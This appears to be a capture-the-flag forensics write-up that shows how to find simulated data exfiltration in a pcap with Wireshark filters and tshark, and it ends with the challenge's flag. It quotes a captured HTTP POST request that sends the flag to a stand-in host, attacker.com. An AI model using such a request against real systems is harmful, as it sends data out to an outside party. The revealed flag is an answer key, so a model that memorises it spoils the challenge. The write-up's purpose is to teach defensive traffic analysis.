# Network Traffic Analysis

**Category:** Forensics  
**Difficulty:** Medium  
**Points:** 300  
**Author:** SPYIREX CTF Team

## Description

We captured network traffic from a suspected data exfiltration. Find what was stolen.

Download: `capture.pcap`

## Solution

### Initial Analysis

Network packet captures can reveal transferred data, credentials, and communication patterns. Wireshark is the primary tool for analysis.

### Approach

Analyze the PCAP file to find suspicious traffic and extract the flag.

### Steps to Solve

1. Open the PCAP in Wireshark
2. Look at protocol hierarchy (Statistics → Protocol Hierarchy)
3. Check for HTTP traffic (common for data exfiltration)
4. Follow HTTP streams to see full conversations
5. Look for POST requests or file transfers
6. Export HTTP objects (File → Export Objects → HTTP)
7. Examine DNS queries for DNS tunneling
8. Check for suspicious strings in packet payloads

### Wireshark Filters Used

```
# HTTP traffic only
http

# POST requests
http.request.method == "POST"

# Specific IP
ip.addr == 192.168.1.100

# DNS queries
dns

# Search for flag pattern
frame contains "JCE{"
```

### Using tshark (command line)

```bash
# Extract HTTP objects
tshark -r capture.pcap --export-objects http,output/

# Search for flag
tshark -r capture.pcap -Y 'frame contains "JCE"' -V

# Follow TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

### Solution Details

Following TCP stream 5 revealed an HTTP POST request with the flag in the body:

```
POST /upload HTTP/1.1
Host: attacker.com
Content-Type: text/plain

Flag: JCE{p4ck3t_c4ptur3_r3v34ls_4ll}
```

### Flag

```
JCE{p4ck3t_c4ptur3_r3v34ls_4ll}
```

## Key Takeaways

- Network traffic analysis can reveal unencrypted communications
- Always check HTTP, FTP, DNS, and SMTP traffic
- Following TCP/UDP streams provides context
- Export objects feature in Wireshark is very useful
- Look for base64 encoded data in HTTP traffic
- DNS tunneling is a common data exfiltration technique
- Tools: Wireshark, tshark, tcpdump, NetworkMiner
